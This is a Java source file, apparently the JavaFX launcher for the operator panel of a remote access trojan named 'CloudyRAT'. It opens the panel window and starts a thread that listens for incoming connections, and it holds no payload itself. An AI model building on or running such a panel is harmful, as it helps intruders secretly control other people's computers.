package com.panel;

import com.MethodsManager;
import com.server.ConnectListener;
import com.server.IntervalPocketSender;
import javafx.application.Application;
import javafx.fxml.FXMLLoader;
import javafx.scene.Parent;
import javafx.scene.Scene;
import javafx.stage.Stage;

public class Main extends Application {
    MethodsManager methodsManager;

    @Override
    public void start(Stage primaryStage) throws Exception{
        FXMLLoader loader = new FXMLLoader(getClass().getResource("sample.fxml"));
        methodsManager = new MethodsManager();

        Controller controller = new Controller(methodsManager);
        loader.setController(controller);

        Parent root = loader.load();
        primaryStage.setTitle("CloudyRAT");
        primaryStage.setScene(new Scene(root, 900, 800));
        primaryStage.show();

        Thread connectionListener = new Thread(new ConnectListener(methodsManager));
        connectionListener.start();

//        Thread intervalPocketSender = new Thread(new IntervalPocketSender(methodsManager));
//        intervalPocketSender.start();

//        Thread serverListener;
//        ServerMethods serverMethods = new ServerMethods();
//        String testString = "updateData()";
//        ArrayList<String> testList = new <String>ArrayList<String>();
//        testList.add("value1");
//        Object submittedObject = testList;
    }


    public static void main(String[] args) {
        launch(args);
        System.exit(0);
    }
}
